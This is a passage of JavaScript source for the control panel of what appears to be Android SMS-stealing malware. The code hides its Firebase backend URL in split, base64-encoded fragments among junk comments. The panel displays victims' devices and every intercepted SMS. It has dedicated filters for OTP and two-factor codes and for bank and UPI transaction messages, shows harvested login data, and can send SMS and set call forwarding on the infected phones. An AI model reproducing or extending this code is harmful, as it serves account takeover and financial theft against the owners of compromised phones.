        const P1 = "aHR0cHM6Ly9z";
       
        //if (info.includes('oppo')) return 'mobile-android';
           // if (info.includes('iphone') || info.includes('ios')) return 'mobile-apple';
 //           if (info.includes('nokia')) return 'mobile-alt';
        const P2 = "bWFydGgtNjhmY2MtZGV";
    //  const setupModal = document.getElementById('setupModal');
    //  const loginModal = document.getElementById('loginModal');
    const P3 = "m";
          //  if (info.includes('realme')) return 'mobile-android';
           // return 'mobile-alt';
        let currentPart2 = "c2hoZGtrP20msdC1ydGRiLmZpcmViYXNlaW8uY2"; 
   //   if (info.includes('vivo')) return 'mobile-android';
    //  if (info.includes('samsung')) return 'mobile-android';
    //  if (info.includes('moto')) return 'mobile-android';
        const P3_Final = "9t";
   //if (pinnedDevicesListener) pinnedDevicesListener();
   //if (forwardNumberListener) forwardNumberListener();
  // if (serialNumbersListener) serialNumbersListener();
        const placeholder = "c2hoZGtrP20m";
     // const loadingScreen = document.getElementById('loadingScreen');
        const correction = "YXV";  
      //  const setupModal = document.getElementById('setupModal');
    //    const loginModal = document.getElementById('loginModal');
        const correctedPart2 = currentPart2.replace(placeholder, correction);
           //if (info.includes('oppo')) return 'mobile-android';
           // if (info.includes('iphone') || info.includes('ios')) return 'mobile-apple';
 //           if (info.includes('nokia')) return 'mobile-alt';
          //  if (info.includes('realme')) return 'mobile-android';
           // return 'mobile-alt';
        const encodedUrl = P1 + P2 + P3 + correctedPart2 + P3_Final;
        
        const decodedUrl = atob(encodedUrl); 
   //if (info.includes('oppo')) return 'mobile-android';
           // if (info.includes('iphone') || info.includes('ios')) return 'mobile-apple';
 //           if (info.includes('nokia')) return 'mobile-alt';
          //  if (info.includes('realme')) return 'mobile-android';
           // return 'mobile-alt';
        const firebaseConfig = {
            databaseURL: decodedUrl 
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        let currentUser = null;
        let allUsers = [];
        let adminPassword = "";
        let currentDeviceData = null;
        let deviceSerialNumbers = {};
        let pinnedDevices = [];
        let allSMSData = [];
        let pendingDeleteAction = null;
        let pendingDeleteData = null;
        let currentDeviceSMS = [];
        let currentDeviceIdForSMS = null;
        let currentSearchTerm = '';
        let currentSMSSearchTerm = '';
        let allLoginData = [];
        
        // Realtime Listeners
        let userDataListener = null;
        let smsDataListener = null;
        let loginDataListener = null;
        let pinnedDevicesListener = null;
        let forwardNumberListener = null;
        let serialNumbersListener = null;

        // DOM Elements
        const loadingScreen = document.getElementById('loadingScreen');
        const setupModal = document.getElementById('setupModal');
        const loginModal = document.getElementById('loginModal');
        const passwordModal = document.getElementById('passwordModal');
        const deviceSMSModal = document.getElementById('deviceSMSModal');
        const dashboard = document.getElementById('dashboard');
        const usersGrid = document.getElementById('usersGrid');
        const pinnedDevicesGrid = document.getElementById('pinnedDevicesGrid');
        const pinnedCount = document.getElementById('pinnedCount');
        const smsList = document.getElementById('smsList');
        const deviceSMSList = document.getElementById('deviceSMSList');
        const loginDataContainer = document.getElementById('loginDataContainer');
        const dataSizeBadge = document.getElementById('dataSizeBadge');
        const onlineCount = document.getElementById('onlineCount');
        const totalCount = document.getElementById('totalCount');
        const deviceSMSTitle = document.getElementById('deviceSMSTitle');
        const smsCount = document.getElementById('smsCount');
        const userSearchResults = document.getElementById('userSearchResults');
        const smsSearchResults = document.getElementById('smsSearchResults');
        const userSearchCount = document.getElementById('userSearchCount');
        const smsSearchCount = document.getElementById('smsSearchCount');

        const modalActionButtonsWrapper = document.getElementById('modalActionButtons');
        const modalSendSMSBtn = document.getElementById('modalSendSMSBtn');
        const modalCallForwardBtn = document.getElementById('modalCallForwardBtn');
        const modalDeleteDeviceBtn = document.getElementById('modalDeleteDeviceBtn');
        
        const paymentTransactionKeywords = [
            'transaction', 'payment', 'transfer', 'credit', 'debit', 'withdraw', 'deposit', 
            'upi', 'imps', 'neft', 'rtgs', 'txn', 'paid', 'sent', 'received', 'purchased',
            'wallet', 'paytm', 'google pay', 'phonepe', 'amazon pay', 'bhim', 'a/c',
            'bank', 'account', 'balance', 'card', 'atm', 'loan', 'emi', 'hdfc', 'sbi', 
            'icici', 'axis', 'kotak'
        ];

        const otpKeywords = [
            'otp', 'one time password', 'verification code', 'auth code', 'security code',
            'login code', 'access code', '2fa', 'two factor', 'authentication code',
            'confirm code', 'verify code', 'activation code', 'security key'
        ];
        
        function toggleDarkMode() {
            const body = document.body;
            body.classList.toggle('light-mode');
            
            const isLightMode = body.classList.contains('light-mode');
            localStorage.setItem('dark-mode-preference', isLightMode ? 'light' : 'dark');

            const toggleBtn = document.getElementById('darkModeToggle');
            if (toggleBtn) {
                if (isLightMode) {
                    toggleBtn.innerHTML = '<i class="fas fa-sun"></i> Light Mode';
                    showToast('Light Mode', 'info');
                } else {
                    toggleBtn.innerHTML = '<i class="fas fa-moon"></i> Dark Mode';
                    showToast('Dark Mode', 'info');
                }
            }
        }
        function checkDarkModePreference() {
            const preference = localStorage.getItem('dark-mode-preference');
            const toggleBtn = document.getElementById('darkModeToggle');
            
            if (preference === 'light') {
                document.body.classList.add('light-mode');
                if (toggleBtn) {
                     toggleBtn.innerHTML = '<i class="fas fa-sun"></i> Light Mode';
                }
            } else {
                if (toggleBtn) {
                     toggleBtn.innerHTML = '<i class="fas fa-moon"></i> Dark Mode';
                }
            }
        }
        document.addEventListener('DOMContentLoaded', function() {
            checkDarkModePreference();
            
            setTimeout(() => {
                loadingScreen.classList.add('hidden');
                checkAdminSetup();
            }, 1500);
        });
        function checkAdminSetup() {
            database.ref('admin_password').once('value')
                .then(snapshot => {
                    const savedPassword = snapshot.val();
                    if (savedPassword) {
                        adminPassword = savedPassword;
                        loginModal.classList.remove('hidden');
                    } else {
                        setupModal.classList.remove('hidden');
                    }
                })
                .catch(error => {
                    console.error('Error checking admin setup:', error);
                    setupModal.classList.remove('hidden');
                });
        }

        function setupAdmin() {
            const password = document.getElementById('setupPassword').value.trim();
            if (password.length >= 4) {
                database.ref('admin_password').set(password)
                    .then(() => {
                        adminPassword = password;
                        setupModal.classList.add('hidden');
                        loginModal.classList.remove('hidden');
                        showToast('Admin password set successfully!', 'success');
                    })
                    .catch(error => {
                        showToast('Error setting password: ' + error.message, 'error');
                    });
            } else {
                showToast('Password must be at least 4 characters', 'error');
            }
        }
        function checkAdminPassword() {
            const password = document.getElementById('adminPassword').value;
            if (password === adminPassword) {
                loginModal.classList.add('hidden');
                dashboard.classList.remove('hidden');
                initializeDashboard();
                showToast('Welcome', 'success');
            } else {
                showToast('Invalid password!', 'error');
            }
        }

        function logout() {
            removeAllListeners();
            
            dashboard.classList.add('hidden');
            loginModal.classList.remove('hidden');
            document.getElementById('adminPassword').value = '';
            showToast('Logged out successfully', 'success');
        }

        function removeAllListeners() {
            if (userDataListener) userDataListener();
            if (smsDataListener) smsDataListener();
            if (loginDataListener) loginDataListener();
            if (pinnedDevicesListener) pinnedDevicesListener();
            if (forwardNumberListener) forwardNumberListener();
            if (serialNumbersListener) serialNumbersListener();
        }

        function updateAdminPassword() {
            const newPassword = document.getElementById('newAdminPassword').value;
            if (newPassword.length >= 4) {
                database.ref('admin_password').set(newPassword)
                    .then(() => {
                        adminPassword = newPassword;
                        document.getElementById('newAdminPassword').value = '';
                        showToast('Admin password updated!', 'success');
                    })
                    .catch(error => {
                        showToast('Error updating password: ' + error.message, 'error');
                    });
            } else {
                showToast('Password must be at least 4 characters', 'error');
            }
        }

        function initializeDashboard() {
            loadSerialNumbers();
            setupRealtimeListeners();
        }

        function setupRealtimeListeners() {
            setupUserDataListener();
            setupSMSDataListener();
            setupLoginDataListener();
            setupPinnedDevicesListener();
            setupForwardNumberListener();
            setupSerialNumbersListener();
        }

        function setupSerialNumbersListener() {
            serialNumbersListener = database.ref('device_serial_numbers').on('value', (snapshot) => {
                deviceSerialNumbers = snapshot.val() || {};
                console.log('Serial numbers updated:', deviceSerialNumbers);
                
                if (allUsers.length > 0) {
                    displayUsers(allUsers);
                }
            }, (error) => {
                console.error('Error loading serial numbers:', error);
                deviceSerialNumbers = {};
            });
        }

        function loadSerialNumbers() {
            database.ref('device_serial_numbers').once('value')
                .then(snapshot => {
                    deviceSerialNumbers = snapshot.val() || {};
                    console.log('Loaded serial numbers:', deviceSerialNumbers);
                })
                .catch(error => {
                    console.error('Error loading serial numbers:', error);
                    deviceSerialNumbers = {};
                });
        }


        function saveSerialNumbers() {
            database.ref('device_serial_numbers').set(deviceSerialNumbers)
                .then(() => {
                    console.log('Serial numbers saved successfully');
                })
                .catch(error => {
                    console.error('Error saving serial numbers:', error);
                });
        }

        
        function setupUserDataListener() {
            userDataListener = database.ref('user_data').on('value', (snapshot) => {
                allUsers = [];
                let onlineUsers = 0;
                let totalUsers = 0;

                snapshot.forEach((userSnapshot) => {
                    const user = userSnapshot.val();
                    user.id = userSnapshot.key;
                    
                    const isOnline = checkUserOnlineStatus(user);
                    user.isOnline = isOnline;
                    
                    if (isOnline) onlineUsers++;
                    totalUsers++;
                    
                    allUsers.push(user);
                });

                assignInstallTimeSerialNumbers(allUsers);                
                allUsers.sort((a, b) => {
                    const serialA = deviceSerialNumbers[a.id] || 0;
                    const serialB = deviceSerialNumbers[b.id] || 0;
                    return serialB - serialA;
                });

                onlineCount.textContent = `Online: ${onlineUsers}`;
                totalCount.textContent = `Total: ${totalUsers}`;
                if (currentSearchTerm) {
                    filterUsers();
                } else {
                    displayUsers(allUsers);
                }
                displayPinnedDevices();
            }, (error) => {
                console.error('Error loading users:', error);
                showToast('Error loading devices', 'error');
            });
        }

        function assignInstallTimeSerialNumbers(users) {
            let hasChanges = false;

            const sortedUsers = [...users].sort((a, b) => {
                const timeA = getInstallTime(a);
                const timeB = getInstallTime(b);
                return timeB - timeA;
            });

            const existingSerials = new Set();
            Object.values(deviceSerialNumbers).forEach(serial => {
                existingSerials.add(serial);
            });
            const installTimeMap = {};
            sortedUsers.forEach(user => {
                installTimeMap[user.id] = getInstallTime(user);
            });
            const allDeviceIds = sortedUsers.map(user => user.id);
            let maxSerial = 0;
            Object.values(deviceSerialNumbers).forEach(serial => {
                if (serial > maxSerial) maxSerial = serial;
            });

       
            const assignedSerials = new Set();
            const newAssignments = {};

           
            sortedUsers.forEach(user => {
                const existingSerial = deviceSerialNumbers[user.id];
                if (existingSerial && !assignedSerials.has(existingSerial)) {
                    newAssignments[user.id] = existingSerial;
                    assignedSerials.add(existingSerial);
                }
            });

      
            let nextAvailableSerial = 1;
            sortedUsers.forEach(user => {
                if (!newAssignments[user.id]) {
            
                    while (assignedSerials.has(nextAvailableSerial)) {
                        nextAvailableSerial++;
                    }
                    
                  
                    if (nextAvailableSerial > maxSerial) {
                        maxSerial = nextAvailableSerial;
                    }
                    
                    newAssignments[user.id] = nextAvailableSerial;
                    assignedSerials.add(nextAvailableSerial);
                    hasChanges = true;
                    console.log(`Assigned serial ${nextAvailableSerial} to device ${user.id} (install time: ${new Date(getInstallTime(user)).toLocaleString()})`);
                    
                    nextAvailableSerial++;
                }
            });

      
            Object.keys(newAssignments).forEach(deviceId => {
                deviceSerialNumbers[deviceId] = newAssignments[deviceId];
            });

     
            Object.keys(deviceSerialNumbers).forEach(deviceId => {
                if (!users.find(user => user.id === deviceId)) {
                    delete deviceSerialNumbers[deviceId];
                    hasChanges = true;
                    console.log(`Removed serial number for deleted device ${deviceId}`);
                }
            });

            if (hasChanges) {
                saveSerialNumbers();
            }
            const finalSerials = new Set();
            let hasDuplicates = false;
            Object.values(deviceSerialNumbers).forEach(serial => {
                if (finalSerials.has(serial)) {
                    console.error(`DUPLICATE SERIAL FOUND: ${serial}`);
                    hasDuplicates = true;
                }
                finalSerials.add(serial);
            });

            if (hasDuplicates) {
                console.error('DUPLICATE SERIAL NUMBERS DETECTED!');
            } else {
                console.log('Serial number assignment completed successfully - No duplicates found');
            }
        }

        function getInstallTime(user) {
       
            if (user.installTime) {
                return new Date(user.installTime).getTime();
            }
            if (user.timestamp) {
                return new Date(user.timestamp).getTime();
            }
            if (user.TimeandDate) {
                return new Date(user.TimeandDate).getTime();
            }
            return Date.now();
        }
        function setupPinnedDevicesListener() {
            pinnedDevicesListener = database.ref('pinned_devices').on('value', (snapshot) => {
                pinnedDevices = snapshot.val() || [];
                pinnedCount.textContent = pinnedDevices.length;
                displayPinnedDevices();
            }, (error) => {
                console.error('Error loading pinned devices:', error);
            });
        }

        function togglePinDevice(userId) {
            event.stopPropagation();
            const index = pinnedDevices.indexOf(userId);
            if (index > -1) {
                // Unpin device
                pinnedDevices.splice(index, 1);
            } else {
                // Pin device
                pinnedDevices.push(userId);
            }
            
            database.ref('pinned_devices').set(pinnedDevices)
                .then(() => {
                    showToast('Device pin status updated!', 'success');
                })
                .catch(error => {
                    showToast('Error updating pin: ' + error.message, 'error');
                });
        }

        function displayPinnedDevices() {
            const pinnedUsers = allUsers.filter(user => pinnedDevices.includes(user.id));
            
            if (pinnedUsers.length > 0) {
                displayUsersGrid(pinnedUsers, pinnedDevicesGrid, true);
            } else {
                pinnedDevicesGrid.innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-thumbtack"></i>
                        <h3>No Pinned Devices</h3>
                        <p>Pin your important devices to see them here</p>
                    </div>
                `;
            }
        }


        function checkUserOnlineStatus(user) {
            
            if (user.status === 'offline') {
                return false;
            }
            
            if (user.status === 'online') {
                return true;
            }
            if (user.timestamp) {
                const lastUpdate = new Date(user.timestamp);
                const now = new Date();
                const diffMinutes = (now - lastUpdate) / (1000 * 60);
                
                if (diffMinutes < 2) {
                    return true;
                }
            }
            if (user.TimeandDate) {
                try {
                    const lastActive = new Date(user.TimeandDate);
                    const now = new Date();
                    const diffMinutes = (now - lastActive) / (1000 * 60);
                    
                    if (diffMinutes < 2) {
                        return true;
                    }
                } catch (e) {
                    console.log('Error parsing TimeandDate:', e);
                }
            }
            
            return false;
        }

        function checkDeviceStatus(userId) {
            const user = allUsers.find(u => u.id === userId);
            if (user) {
                const isOnline = checkUserOnlineStatus(user);
                showToast(`Device ${user.d_name} is ${isOnline ? 'Online' : 'Offline'}`, isOnline ? 'success' : 'warning');
            }
        }

        function getDeviceIcon(deviceInfo) {
            if (!deviceInfo) return 'mobile-alt';
            
            const info = deviceInfo.toLowerCase();
            if (info.includes('vivo')) return 'mobile-android';
            if (info.includes('samsung')) return 'mobile-android';
            if (info.includes('moto')) return 'mobile-android';
            if (info.includes('xiaomi') || info.includes('redmi')) return 'mobile-android';
            if (info.includes('oppo')) return 'mobile-android';
            if (info.includes('iphone') || info.includes('ios')) return 'mobile-apple';
            if (info.includes('nokia')) return 'mobile-alt';
            if (info.includes('realme')) return 'mobile-android';
            return 'mobile-alt';
        }

        function getBatteryColor(level) {
            if (level >= 70) return '#4CAF50';
            if (level >= 30) return '#ff9800';
            return '#f44336';
        }

        function displayUsers(users) {
            displayUsersGrid(users, usersGrid, false);
        }

        function displayUsersGrid(users, gridElement, isPinnedSection) {
            gridElement.innerHTML = '';
            
            if (users.length === 0) {
                gridElement.innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-users-slash"></i>
                        <h3>No Devices Found</h3>
                        <p>No devices are currently connected</p>
                    </div>
                `;
                return;
            }

            users.forEach(user => {
                const deviceIcon = getDeviceIcon(user.Device_info || user.device_info);
                const batteryLevel = user.battery || user.batteryLevel || 0;
                const batteryColor = getBatteryColor(batteryLevel);
                const batteryWidth = Math.max(10, Math.min(100, batteryLevel));
                const deviceName = user.Device_info || user.device_info || 'Unknown Device';
                const dName = user.d_name || 'Unknown';
                const serialNumber = deviceSerialNumbers[user.id] || 0;
                const isPinnedDevice = pinnedDevices.includes(user.id);
                const isSearchResult = currentSearchTerm && checkUserMatchSearch(user, currentSearchTerm);
                
                const userCard = document.createElement('div');
                userCard.className = `user-card ${user.isOnline ? 'online' : 'offline'} ${isPinnedDevice ? 'pinned' : ''} ${isSearchResult ? 'highlight' : ''}`;
                userCard.onclick = () => openUserModal(user);

                userCard.innerHTML = `
                    <div class="user-header">
                        <div class="device-info">
                            <div class="device-serial" onclick="event.stopPropagation(); navigateToDevice('${user.id}')">${serialNumber}</div>
                            <i class="fas fa-${deviceIcon} device-icon"></i>
                            <div style="flex: 1;">
                                <div class="user-id">${dName}</div>
                                
                            </div>
                        </div>
                        <div style="display: flex; align-items: center; gap: 8px;">
                            <div class="user-status ${user.isOnline ? 'status-online' : 'status-offline'}">
                                ${user.isOnline ? 'Online' : 'Offline'}
                            </div>
                            <button class="status-check-btn" onclick="event.stopPropagation(); checkDeviceStatus('${user.id}')">
                                <i class="fas fa-sync-alt"></i>
                            </button>
                            ${!isPinnedSection ? `
                                <button class="pin-btn" onclick="event.stopPropagation(); togglePinDevice('${user.id}')">
                                    <i class="fas ${isPinnedDevice ? 'fa-thumbtack' : 'fa-thumbtack'}"></i>
                                </button>
                            ` : ''}
                        </div>
                    </div>
                    
                    <div class="battery-info">
                        
                        <span>Battery:</span>
                        <div class="battery-level">
                            <div class="battery-fill" style="width: ${batteryWidth}%; background: ${batteryColor};"></div>
                            
                        </div>
                        <span>${batteryLevel}%</span>
                    </div>
                    
                    <div class="user-info">
                        
                        
                        <div><strong>SIM 1:</strong> ${user.numberSim1 || 'No SIM'}</div>
                        <div><strong>SIM 2:</strong> ${user.numberSim2 || 'No SIM'}</div>
                        
                        
                    </div>
                    
                    <br>
                    <div class="header">
                        <button class="nav-btn active" onclick="event.stopPropagation(); openSendSMSModal('${user.id}')">
                            <i class="fas fa-sms"></i> Send
                        </button>
            <button class="nav-btn active" onclick="event.stopPropagation(); openCallForwardModal('${user.id}')">
                            <i class="fas fa-phone"></i> Forward
                        </button>
                   </div>
                   
                    <div class="header" >
                        <button class="nav-btn active" onclick="event.stopPropagation(); getAllDeviceSMS('${user.id}')">
                            <i class="fas fa-envelope"></i> All SMS
                        </button>
                        <button class="nav-btn active" onclick="event.stopPropagation(); requestDeleteDevice('${user.id}')">
                            <i class="fas fa-trash"></i> Delete
                        </button>
                       
                        
                    </div>
                    
                    
                    <br>
                    <div><strong>Last Active:</strong> ${user.TimeandDate || (user.timestamp ? new Date(user.timestamp).toLocaleString() : 'Never')}</div>
                `;

                gridElement.appendChild(userCard);
            });
        }

        function getInstallTimeDisplay(user) {
            const installTime = getInstallTime(user);
            return new Date(installTime).toLocaleString();
        }
        function showSection(sectionName) {
            document.querySelectorAll('.content-section').forEach(section => {
                section.classList.add('hidden');
            });
            
            document.querySelectorAll('.nav-btn').forEach(btn => {
                btn.classList.remove('active');
            });

            document.getElementById(sectionName + 'Section').classList.remove('hidden');
             document.querySelectorAll('.header .nav-btn').forEach(btn => {
                if (btn.textContent.includes('Devices') && sectionName === 'users') {
                    btn.classList.add('active');
                } else if (btn.textContent.includes('All SMS') && sectionName === 'sms') {
                    btn.classList.add('active');
                } else if (btn.textContent.includes('Data') && sectionName === 'dataGroup') {
                    btn.classList.add('active');
                } else if (btn.textContent.includes('Pin') && sectionName === 'pinned') {
                    btn.classList.add('active');
                } else if (btn.textContent.includes('cog') && sectionName === 'settings') {
                    btn.classList.add('active');
                }
            });

            if (sectionName === 'dataGroup') {
                loadAllLoginData();
            }
        }

        function navigateToDevice(userId) {
            event.stopPropagation();
            
            showSection('users');

            const user = allUsers.find(u => u.id === userId);
            if (user) {
                const serialNumber = deviceSerialNumbers[userId] || 0;
                document.getElementById('userSearch').value = `#${serialNumber}`;
                currentSearchTerm = `#${serialNumber}`;
                filterUsers();
                setTimeout(() => {
                    const userCards = document.querySelectorAll('.user-card');
                    userCards.forEach(card => {
                        if (card.querySelector('.device-serial')?.textContent === serialNumber.toString()) {
                            card.classList.add('highlight');
                            card.scrollIntoView({ behavior: 'smooth', block: 'center' });
                        }
                    });
                }, 500);
            }
        }

        function navigateToDeviceFromSMS(userId) {
            event.stopPropagation();
            showSection('users');
            const user = allUsers.find(u => u.id === userId);
            if (user) {
                const serialNumber = deviceSerialNumbers[userId] || 0;
                document.getElementById('userSearch').value = userId;
                currentSearchTerm = userId;
                filterUsers();
                setTimeout(() => {
                    const userCards = document.querySelectorAll('.user-card');
                    userCards.forEach(card => {
                        if (card.querySelector('.device-serial')?.textContent === serialNumber.toString() || card.querySelector('.user-id')?.textContent.includes(user.d_name || '')) {
                            card.classList.add('highlight');
                            card.scrollIntoView({ behavior: 'smooth', block: 'center' });
                        } else {
                             card.classList.remove('highlight');
                        }
                    });
                     showToast(`Mapped to Device: ${user.d_name || user.id}`, 'info');
                }, 500);
            }
        }
        function navigateToDeviceFromData(userId) {
            
            showSection('users'); 

            const user = allUsers.find(u => u.id === userId);
            if (user) {
                const serialNumber = deviceSerialNumbers[userId] || 0;

                document.getElementById('userSearch').value = userId; 
                currentSearchTerm = userId;

                filterUsers(); 

                setTimeout(() => {
                    const userCards = document.querySelectorAll('.user-card');
                    let found = false;
                    userCards.forEach(card => {
                        
                        if (card.querySelector('.device-serial')?.textContent === serialNumber.toString() || user.id === userId) {
                            card.classList.add('highlight');
                            card.scrollIntoView({ behavior: 'smooth', block: 'center' });
                            found = true;
                        } else {
                             card.classList.remove('highlight');
                        }
                    });
                    if (found) {
                        showToast(`Devices सेक्शन पर मैप किया गया: ${user.d_name || user.id}`, 'success');
                    } else {
                         showToast('डिवाइस कार्ड सर्च करें', 'warning');
                    }
                }, 500);
            } else {
                showToast('डिवाइस डेटा में नहीं मिला!', 'error');
            }
        }

        function filterUsers() {
            const searchTerm = document.getElementById('userSearch').value.toLowerCase();
            currentSearchTerm = searchTerm;
            
            if (searchTerm) {
                const filteredUsers = allUsers.filter(user => checkUserMatchSearch(user, searchTerm));
                
                userSearchResults.classList.remove('hidden');
                userSearchCount.textContent = `${filteredUsers.length} device${filteredUsers.length !== 1 ? 's' : ''} found for "${searchTerm}"`;

                displayUsersGrid(filteredUsers, usersGrid, false);
            } else {
                clearUserSearch();
            }
        }

        function checkUserMatchSearch(user, searchTerm) {
            const serialNumber = deviceSerialNumbers[user.id] || 0;
            const searchText = searchTerm.replace('#', ''); // Remove # for serial number search
            
            return (
                (serialNumber && serialNumber.toString().includes(searchText)) ||
                (user.id && user.id.toLowerCase().includes(searchTerm)) ||
                (user.Device_info && user.Device_info.toLowerCase().includes(searchTerm)) ||
                (user.device_info && user.device_info.toLowerCase().includes(searchTerm)) ||
                (user.d_name && user.d_name.toLowerCase().includes(searchTerm)) ||
                (user.numberSim1 && user.numberSim1.toLowerCase().includes(searchTerm)) ||
                (user.numberSim2 && user.numberSim2.toLowerCase().includes(searchTerm))
            );
        }

        function clearUserSearch() {
            document.getElementById('userSearch').value = '';
            currentSearchTerm = '';
            userSearchResults.classList.add('hidden');

            document.querySelectorAll('.user-card.highlight').forEach(card => {
                card.classList.remove('highlight');
            });
            
            displayUsers(allUsers);
        }
        function setupSMSDataListener() {
            smsDataListener = database.ref('user_sms').on('value', (snapshot) => {
                allSMSData = [];
                
                snapshot.forEach((userSnapshot) => {
                    const userId = userSnapshot.key;
                    userSnapshot.forEach((smsSnapshot) => {
                        const sms = smsSnapshot.val();
                        sms.id = smsSnapshot.key;
                        sms.userId = userId;
                        sms.deviceSerial = deviceSerialNumbers[userId] || 'N/A';
                        allSMSData.push(sms);
                    });
                });

                allSMSData.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
                
                // Apply current SMS search filter if any
                if (currentSMSSearchTerm) {
                    filterSMS();
                } else {
                    displaySMS(allSMSData);
                }
            }, (error) => {
                console.error('Error loading SMS:', error);
            });
        }

        function filterSMS() {
            const searchTerm = document.getElementById('smsSearch').value.toLowerCase();
            currentSMSSearchTerm = searchTerm;
            
            if (searchTerm) {
                const filteredSMS = allSMSData.filter(sms => checkSMSMatchSearch(sms, searchTerm));
                
                smsSearchResults.classList.remove('hidden');
                smsSearchCount.textContent = `${filteredSMS.length} message${filteredSMS.length !== 1 ? 's' : ''} found for "${searchTerm}"`;

                displaySMS(filteredSMS);
            } else {

                clearSMSSearch();
            }
        }

        function filterPaymentTransactionSMS() {
            const paymentTransactionSMS = allSMSData.filter(sms => isPaymentTransactionSMS(sms));
            
            smsSearchResults.classList.remove('hidden');
            smsSearchCount.textContent = `${paymentTransactionSMS.length} payment/transaction message${paymentTransactionSMS.length !== 1 ? 's' : ''} found`;
            
            displaySMS(paymentTransactionSMS);
        }

        function filterOTPSMS() {
            const otpSMS = allSMSData.filter(sms => isOTPSMS(sms));
            
            smsSearchResults.classList.remove('hidden');
            smsSearchCount.textContent = `${otpSMS.length} OTP message${otpSMS.length !== 1 ? 's' : ''} found`;
            
            displaySMS(otpSMS);
        }

        function isPaymentTransactionSMS(sms) {
            const body = (sms.body || '').toLowerCase();
            const sender = (sms.sender || '').toLowerCase();
            
            return paymentTransactionKeywords.some(keyword => 
                body.includes(keyword) || sender.includes(keyword)
            );
        }

        function isOTPSMS(sms) {
            const body = (sms.body || '').toLowerCase();
            const sender = (sms.sender || '').toLowerCase();
            
            return otpKeywords.some(keyword => 
                body.includes(keyword) || sender.includes(keyword)
            );
        }

        function checkSMSMatchSearch(sms, searchTerm) {
            const deviceSerial = sms.deviceSerial.toString();
            return (
                (sms.sender && sms.sender.toLowerCase().includes(searchTerm)) ||
                (sms.body && sms.body.toLowerCase().includes(searchTerm)) ||
                (sms.userId && sms.userId.toLowerCase().includes(searchTerm)) ||
                (deviceSerial && deviceSerial.includes(searchTerm)) ||
                (sms.sim_number && sms.sim_number.toLowerCase().includes(searchTerm))
            );
        }

        function clearSMSSearch() {
            document.getElementById('smsSearch').value = '';
            currentSMSSearchTerm = '';
            smsSearchResults.classList.add('hidden');
            document.querySelectorAll('.sms-item.highlight').forEach(item => {
                item.classList.remove('highlight');
            });
            
            displaySMS(allSMSData);
        }

        function displaySMS(smsArray) {
            smsList.innerHTML = '';
            
            if (smsArray.length === 0) {
                smsList.innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-envelope-open"></i>
                        <h3>No SMS Messages</h3>
                        <p>No SMS messages found in the database</p>
                    </div>
                `;
                return;
            }

            smsArray.forEach(sms => {
                const isSearchResult = currentSMSSearchTerm && checkSMSMatchSearch(sms, currentSMSSearchTerm);
                const isPaymentTransaction = isPaymentTransactionSMS(sms);
                const isOTP = isOTPSMS(sms);
                
                const smsItem = document.createElement('div');
                smsItem.className = `sms-item ${isSearchResult ? 'highlight' : ''} ${isPaymentTransaction ? 'payment-transaction-sms' : ''} ${isOTP ? 'otp-sms' : ''}`;
                smsItem.onclick = () => navigateToDeviceFromSMS(sms.userId);
                smsItem.style.cursor = 'pointer';
                smsItem.innerHTML = `
                    <div class="sms-header">
                        <div class="sms-sender">${sms.sender || 'Unknown'}</div>
                        <div class="sms-date">${sms.date ? new Date(sms.date).toLocaleString() : 'Unknown date'}</div>
                    </div>
                    <div class="sms-body">${sms.body || 'No content'}</div>
                    <div class="sms-device">
                        <div>
                            <strong>SIM:</strong> ${sms.sim_number || 'Unknown'} | 
                            <strong>Type:</strong> ${sms.type || 'Received'} |
                            <strong>Date:</strong> ${sms.date ? new Date(sms.date).toLocaleDateString() : 'Unknown'}
                            ${isPaymentTransaction ? ' | <span style="color: var(--color-online); font-weight: bold;">&#x1F4B8; Transaction</span>' : ''}
                            ${isOTP ? ' | <span style="color: var(--color-warning); font-weight: bold;">&#x1F512; OTP</span>' : ''}
                        </div>
                        <div style="font-weight: bold; color: var(--color-accent-main);">
                            Device ID: ${sms.userId || 'N/A'}
                        </div>
                    </div>
                `;

                smsList.appendChild(smsItem);
            });
        }

        function setupLoginDataListener() {
            loginDataListener = database.ref('login').on('value', (snapshot) => {
                loadAllLoginData();
            }, (error) => {
                console.error('Error loading login data:', error);
            });
        }

        function loadAllLoginData() {
            allLoginData = [];
            let totalDataSize = 0;
            
            database.ref('login').once('value')
                .then(snapshot => {
                    const loginDataPromises = [];
                    
                    snapshot.forEach(userSnapshot => {
                        const userId = userSnapshot.key;
                        const userLoginData = userSnapshot.val();
                        
                        if (userLoginData && Object.keys(userLoginData).length > 0) {
                            const user = allUsers.find(u => u.id === userId);
                            const serialNumber = deviceSerialNumbers[userId] || 'N/A';
                            const deviceName = user ? (user.d_name || 'Unknown Device') : 'Unknown Device';
                            const dataSize = JSON.stringify(userLoginData).length;
                            totalDataSize += dataSize;

                            let latestTimestamp = 0;
                            Object.keys(userLoginData).forEach(recordKey => {
                                const record = userLoginData[recordKey];
                                if (record && record.timestamp) {
                                    latestTimestamp = Math.max(latestTimestamp, record.timestamp);
                                }
                            });
                            
                            allLoginData.push({
                                userId: userId,
                                serialNumber: serialNumber,
                                deviceName: deviceName,
                                loginData: userLoginData,
                                dataSize: dataSize,
                                latestTimestamp: latestTimestamp
                            });
                        }
                    });
                    
                    allLoginData.sort((a, b) => {
                        if (a.serialNumber !== b.serialNumber) {
                            return b.serialNumber - a.serialNumber;
                        }
                        return b.latestTimestamp - a.latestTimestamp;
                    });

                    displayAllLoginData();

                    const totalKB = (totalDataSize / 1024).toFixed(2);
                    dataSizeBadge.textContent = `${totalKB} KB Data`;
                })
                .catch(error => {
                    console.error('Error loading login data:', error);
                    showToast('Error loading login data', 'error');
                });
        }

        function displayAllLoginData() {
            loginDataContainer.innerHTML = '';
            
            if (allLoginData.length === 0) {
                loginDataContainer.innerHTML = `
                    <div class="empty-state">
                        <i class="fas fa-database"></i>
                        <h3>No Login Data</h3>
                        <p>No login data found for any devices</p>
                    </div>
                `;
                return;
            }

            allLoginData.forEach(data => {
                const serialGroup = document.createElement('div');
                serialGroup.className = 'serial-group';
                
                const recordCount = Object.keys(data.loginData).length;
                
                serialGroup.innerHTML = `
                    <div class="serial-header" onclick="toggleSerialGroup(this)">
                        <div class="serial-info">
                            <div class="serial-number">${data.serialNumber}</div>
                            <div class="device-details">
                                <div class="device-name">${data.deviceName}</div>
                                <div class="device-id">${data.userId}</div>
                            </div>
                        </div>
                        
